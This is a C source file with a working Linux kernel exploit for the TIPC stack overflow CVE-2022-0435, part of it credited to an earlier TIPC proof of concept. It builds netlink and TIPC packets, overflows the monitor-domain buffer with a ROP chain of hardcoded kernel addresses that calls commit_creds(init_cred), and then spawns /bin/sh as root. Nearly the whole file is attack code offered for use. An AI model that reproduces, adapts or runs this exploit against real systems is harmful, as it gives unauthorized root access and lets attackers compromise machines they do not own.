/* from https://github.com/zzhacked/CVE-2021-43267/blob/main/poc.py */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <stdarg.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/ipc.h>
#include <sys/ioctl.h>
#include <sys/msg.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <time.h>
#include <unistd.h>
#include <linux/netlink.h>

// some constants
#define NODE_ID        0x11223344
#define TIPC_UDP_PORT  6118

// TIPC crap
#define TIPC_VERSION   2

// user messages
#define LINK_PROTOCOL  7
#define LINK_CONFIG    13

// message types
#define STATE_MSG      0
#define RESET_MSG      1
#define ACTIVATE_MSG   2
#define MSG_CRYPTO     14

// media types
#define MEDIA_TYPE_UDP 3

// w0
#define hdr_msg_size(v) ((v) & 0x1ffff)
#define hdr_size(v) ((v & 0xf) << 21)
#define hdr_user(v) ((v & 0xf) << 25)
#define hdr_nonseq(v) ((v & 1) << 20)
#define hdr_version(v) ((v & 7) << 29)

// w1
#define hdr_msg_type(v) ((v & 7) << 29)

// w2
#define hdr_link_level_seq(v) (v & 0xffff)
#define hdr_link_level_ack(v) ((v & 0xffff) << 16)

// w4
#define hdr_next_send_pkt(v) (v & 0xffff)

// w5
#define hdr_media_id(v) (v & 0xff)
#define hdr_session_number(v) ((v & 0xffff) << 16)

// utility
#define info(fmt, args...) report('$', false, fmt, ## args)
#define infov(fmt, args...) report('~', false, fmt, ## args)
#define maybe(fmt, args...) report('?', false, fmt, ## args)
#define fatal(fmt, args...) report('!', true, fmt, ## args)
#define info_value64(name, value) infov("%-24s: %016lx", name, value)

#define be16 htons
#define be32 htonl

// globals
int g_sockfd = 0;
struct sockaddr_in g_sockaddr;

void report(char indicator, bool error, const char *fmt, ...) {
    FILE *stream = (error) ? stderr : stdout;
    va_list a;
    va_start(a, fmt);
    fprintf(stream, "[%c] %s", indicator, (error) ? "ERROR: " : "");
    vfprintf(stream, fmt, a);
    fprintf(stream, "\n");
    va_end(a);

    if (error) {
        exit(-1); // all errors are fatal
    }
}

int netlink_send(
    uint16_t type, uint16_t flags, uint32_t seq, 
    uint8_t* pkt, size_t pkt_len,
    uint8_t **reply_buf, size_t *reply_sz
) {
    int sock_fd;
    struct sockaddr_nl sa;
    memset(&sa, 0, sizeof(struct sockaddr_nl));
    sa.nl_family = AF_NETLINK;

    size_t pkt_full_len = sizeof(struct nlmsghdr) + pkt_len;
    uint8_t *pkt_full = malloc(pkt_full_len);
    memset(pkt_full, 0, pkt_full_len); 
    memcpy(pkt_full + sizeof(struct nlmsghdr), pkt, pkt_len);

    struct nlmsghdr *netlink_hdr = (struct nlmsghdr*)(pkt_full);
    netlink_hdr->nlmsg_len = pkt_full_len;
    netlink_hdr->nlmsg_type = type;
    netlink_hdr->nlmsg_flags = flags;
    netlink_hdr->nlmsg_seq = seq;
    netlink_hdr->nlmsg_pid = getpid();

    if ((sock_fd = socket(PF_NETLINK, SOCK_RAW, NETLINK_GENERIC)) < 0) {
        perror("socket");
        return -1;
    }

    if (bind(sock_fd, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
        perror("bind");
        return -1;
    }

    ssize_t r = sendto(
        sock_fd, pkt_full, pkt_full_len, 0, 
        (struct sockaddr*)&sa, sizeof(struct sockaddr_nl)
    );

    if (r < 0) {
        perror("sendto");
        return -1;
    }

    free(pkt_full);

    if (reply_buf != NULL) {
        struct msghdr m;
        memset(&m, 0, sizeof(struct msghdr));
        m.msg_iovlen = 1;
        m.msg_iov = malloc(sizeof(struct iovec));
        m.msg_iov->iov_base = malloc(0x1000);
        m.msg_iov->iov_len = 0x1000;

        size_t nread;

        if ((nread = recvmsg(sock_fd, &m, 0)) < 0) {
            goto error;
        }

        if (m.msg_iovlen != 1) {
            goto error;
        }

        *reply_sz = nread;
        *reply_buf = malloc(*reply_sz);
        memcpy(*reply_buf, m.msg_iov->iov_base, *reply_sz);
        free(m.msg_iov->iov_base);
    }

    close(sock_fd);
    return 0;

error:
    close(sock_fd);
    return -1;
}

int netlink_enable_tipc_udp(char *str_ip_address) {
    uint8_t pkt_ctrl[]={
        0x03, 0x01, 0x00, 0x00, 0x06, 0x00, 0x01, 0x00, 
        0x10, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x02, 0x00, 
        0x54, 0x49, 0x50, 0x43, 0x76, 0x32, 0x00, 0x00
    };

    uint8_t *nl_reply;
    size_t nl_reply_len = 0;
    uint32_t ip_addr;
    uint32_t seq;
    int r;

    seq = time(NULL);

    ip_addr = inet_addr(str_ip_address);
    if (ip_addr == INADDR_NONE) {
        fatal("invalid ip address given");
    }

    r = netlink_send(
        NLMSG_MIN_TYPE, (NLM_F_REQUEST | NLM_F_ACK), seq,
        pkt_ctrl, sizeof(pkt_ctrl), &nl_reply, &nl_reply_len
    );

    if(r < 0) {
        fatal("failed to send netlink control message.");
    }

    if (nl_reply_len == 0) {
        fatal("did not get netlink control message reply.");
    }

    if (*(uint32_t*)(nl_reply + 0x10) == 0xfffffffe) {
        fatal("tipc support not available.");
    }

    uint16_t nlmsg_type = 0;
    off_t pos = 0x14;

    while(pos < nl_reply_len - 4) {
        struct nlattr *attr = (struct nlattr*)(nl_reply + pos);
        if (attr->nla_type == 1) {
            nlmsg_type = *(uint16_t*)(nl_reply + pos + 4);
            break;
        }
        pos += attr->nla_len;
        if ((attr->nla_len % 4) != 0) {
            pos += 4 - (attr->nla_len % 4);
        }
    }

    if (nlmsg_type == 0) {
        fatal("could not find tipc netlink message type.");
    }

    uint8_t pkt_tipc_enable_udp[]={
        0x03, 0x01, 0x00, 0x00, 0x40, 0x00, 0x01, 0x80,
        0x0d, 0x00, 0x01, 0x00, 0x75, 0x64, 0x70, 0x3a,
        0x55, 0x44, 0x50, 0x31, 0x00, 0x00, 0x00, 0x00,
        0x2c, 0x00, 0x04, 0x80, 0x14, 0x00, 0x01, 0x00,
        0x02, 0x00, 0x17, 0xe6, 0x00, 0x00, 0x00, 0x00, // <-- +0x24 = ip
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x14, 0x00, 0x02, 0x00, 0x02, 0x00, 0x17, 0xe6,
        0xe4, 0x00, 0x12, 0x67, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00
    };

    *(uint32_t*)(pkt_tipc_enable_udp + 0x24) = ip_addr;

    r = netlink_send(
        nlmsg_type, (NLM_F_REQUEST | NLM_F_ACK), seq, 
        pkt_tipc_enable_udp, sizeof(pkt_tipc_enable_udp), NULL, NULL
    );

    if (r < 0) {
        fatal("failed to send netlink tipc udp enable message.");
    }

    // the right way is to read back a netlink reply and check if this worked..
    // I chose to go with the scientifically proven method of big chillin'
    sleep(2);

    return 0;
}

// tipc packet routines
void gen_tipc_hdr(
    uint8_t *o,
    uint32_t w0, uint32_t w1, uint32_t w2, 
    uint32_t w3, uint32_t w4, uint32_t w5
) {
    uint32_t* o32 = (uint32_t*)o;
    o32[0] = be32(w0);
    o32[1] = be32(w1);
    o32[2] = be32(w2);
    o32[3] = be32(w3);
    o32[4] = be32(w4);
    o32[5] = be32(w5);
}

ssize_t tipc_send(uint8_t *buf, size_t sz) {
    return sendto(
        g_sockfd, buf, sz, 0, (struct sockaddr*)&g_sockaddr, sizeof(g_sockaddr)
    );
}

void tipc_discover() {
    uint32_t w0, w1, w2, w3, w4, w5;
    uint8_t pkt[24];
    w0 = 0;
    w0 |= hdr_version(TIPC_VERSION);
    w0 |= hdr_size(6);
    w0 |= hdr_msg_size(24);
    w0 |= hdr_user(LINK_CONFIG);
    w0 |= hdr_nonseq(1);
    w1 = 0;
    w2 = 0;
    w3 = NODE_ID;
    w4 = 0x1267;
    w5 = hdr_media_id(MEDIA_TYPE_UDP);
    gen_tipc_hdr(pkt, w0, w1, w2, w3, w4, w5);
    tipc_send(pkt, sizeof(pkt));
}

void tipc_link_state_a(uint32_t ip) {
    uint8_t pkt[56];
    uint32_t *body = (uint32_t*)(pkt + 24);
    uint32_t w0, w1, w2, w3, w4, w5;

    memset(pkt, 0, sizeof(pkt));

    w0 = hdr_version(TIPC_VERSION);
    w0 |= hdr_size(10);
    w0 |= hdr_user(LINK_PROTOCOL);
    w0 |= hdr_msg_size(56);
    w1 = hdr_msg_type(RESET_MSG);
    w2 = hdr_link_level_seq(0x8000);
    w3 = NODE_ID;
    w4 = hdr_next_send_pkt(1);
    w5 = hdr_session_number(50388);
    gen_tipc_hdr(pkt, w0, w1, w2, w3, w4, w5);

    int pos = 0;
    body[pos++] = be32(NODE_ID);
    body[pos++] = be32(ip);
    body[pos++] = 0;
    body[pos++] = be32(3500 << 16);
    memcpy(body + 4, "UDP1", 4);
    tipc_send(pkt, sizeof(pkt));
}

void tipc_link_state_b(uint32_t ip) {
    uint8_t pkt[44];
    uint32_t w0, w1, w2, w3, w4, w5;
    uint32_t *body = (uint32_t*)(pkt + 24);

    memset(pkt, 0, sizeof(pkt));

    w0 = hdr_version(TIPC_VERSION);
    w0 |= hdr_size(10);
    w0 |= hdr_user(LINK_PROTOCOL);
    w0 |= hdr_msg_size(44);
    w1 = hdr_msg_type(STATE_MSG);
    w2 = hdr_link_level_seq(1);
    w3 = NODE_ID;
    w4 = hdr_next_send_pkt(1);
    w5 = hdr_session_number(50388);

    gen_tipc_hdr(pkt, w0, w1, w2, w3, w4, w5);

    int pos = 0;
    body[pos++] = be32(NODE_ID);
    body[pos++] = be32(ip);
    body[pos++] = 0; // timestamp
    body[pos++] = 0; // max pkt/link tolerance
    body[pos++] = 0; // bearer instance
    tipc_send(pkt, sizeof(pkt));
}

int tipc_link_setup(char *host) {
    if ((g_sockfd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1) {
        perror("socket");
        return -1;
    }

    memset((char *) &g_sockaddr, 0, sizeof(g_sockaddr));
    g_sockaddr.sin_family = AF_INET;
    g_sockaddr.sin_port = htons(TIPC_UDP_PORT);

    if (inet_aton(host, &g_sockaddr.sin_addr) == 0) {
        perror("inet_aton");
        return -1;
    }

    tipc_discover();
    tipc_link_state_a(be32(inet_addr(host)));
    tipc_link_state_b(be32(inet_addr(host)));

    return 0;
}

/* my works */
#define MAX_MON_DOMAIN 64
#define IP_ADDR "127.0.0.1"

struct tipc_mon_domain {
	uint16_t len;
	uint16_t gen;
	uint16_t ack_gen;
	uint16_t member_cnt;
	uint64_t up_map;
	uint32_t members[MAX_MON_DOMAIN];
};

void send_payload(uint8_t* payload, uint32_t payload_len, int seqno) 
{
    uint8_t pkt[0x1000];
    uint32_t w0, w1, w2, w3, w4, w5;
    uint32_t ip = be32(inet_addr(IP_ADDR));
    uint32_t *body = (uint32_t*)(pkt + 24);
    int ackno = seqno + 1;

    memset(pkt, 0, sizeof(pkt));

    w0 = hdr_version(TIPC_VERSION);
    w0 |= hdr_size(10);
    w0 |= hdr_user(LINK_PROTOCOL);
    w0 |= hdr_msg_size(0x28 + sizeof(struct tipc_mon_domain) + payload_len);
    w1 = hdr_msg_type(STATE_MSG);
    w2 = hdr_link_level_seq(seqno);
    w2 |= hdr_link_level_ack(ackno);
    w3 = NODE_ID;
    w4 = 0;
    w5 = hdr_session_number(50388);

    gen_tipc_hdr(pkt, w0, w1, w2, w3, w4, w5);

    int pos = 0;
    body[pos++] = be32(NODE_ID);
    body[pos++] = be32(ip);
    body[pos++] = 0;
    body[pos++] = 0;

    /* beginning of data; checkout tipc_mon_rcv */
    struct tipc_mon_domain* mon_domain = &body[pos];
    mon_domain->len = be16(sizeof(struct tipc_mon_domain) + payload_len);
    mon_domain->gen = be16(seqno);
    mon_domain->ack_gen = be16(ackno);
    mon_domain->member_cnt = be16((payload_len / 4) + MAX_MON_DOMAIN);
    mon_domain->up_map = 0x0;

    /* end of data */
    uint8_t* end_of_data = &mon_domain->members[MAX_MON_DOMAIN];
    if (payload)
        memcpy(end_of_data, payload, payload_len);

    tipc_send(pkt, sizeof(pkt));
}

void trigger(int seqno) 
{
    send_payload(NULL, 0, seqno);
}

#define rop(x) payload[idx++] = ((uint64_t)be32(x >> 32) << 32) | (uint64_t)be32(x & 0xffffffff);

/* funtion */
#define commit_creds 0xffffffff810f2780
#define bpf_get_current_task 0xffffffff81234280
#define tipc_node_find 0xffffffffc00238d0
#define tipc_node_delete 0xffffffffc0024a60

/* data */
#define init_cred 0xffffffff82a8e420
#define init_net 0xffffffff83398b80
#define softirq_stack_end 0xffffc90000004000

/* gadget */
#define cli 0xffffffff81e001f3
#define escape_gadget 0xffffffff822001ba
#define pop_rdi 0xffffffff81dda5fe
#define pop_rsi 0xffffffff81a47752
#define pop_rsp 0xffffffff81d4f54d
#define mov_rdi_rax 0xffffffffc0011419

uint32_t make_payload(uint64_t* payload) 
{
    uint32_t idx = 0;
    
    rop(0UL);         
    rop(0UL);         
    rop(0UL);         
    rop(0UL);         
    rop(0UL);         
    rop(softirq_stack_end - 0x18);   // rbp
    rop(pop_rdi);
    rop(init_net);
    rop(pop_rsi);
    rop(NODE_ID)
    rop(tipc_node_find);
    rop(mov_rdi_rax);
    rop(softirq_stack_end - 0x18);
    rop(tipc_node_delete);
    rop(cli);
    rop(escape_gadget);
    idx += 11;
    rop(pop_rdi);
    rop(init_cred);
    rop(commit_creds);
    rop(pop_rsp);
    rop(softirq_stack_end - 0x10);
    
    return idx * 8;
}

int main(int argc, char *argv[]) 
{
    int seqno = 0;
    uint8_t payload[0x1000] = { 0, };
    uint32_t payload_len;

    puts("---- Linux 5.19 CVE-2022-0435 exploit ----");

    info("enable tipc udp media");
    if (netlink_enable_tipc_udp(IP_ADDR) < 0) {
        fatal("failed to enable tipc udp media");
    }

    info("establish tipc link");
    if (tipc_link_setup(IP_ADDR) < 0) {
        fatal("failed to establish tipc link");
    }

    info("trigger the bug ");
    payload_len = make_payload((uint64_t*)payload);
    if (payload_len % 4) {
        payload_len += payload_len + 4 - (payload_len % 4);
    }

    send_payload(payload, payload_len, ++seqno);

    trigger(++seqno);

    info("done!");
    system("/bin/sh");

    return 0;
}
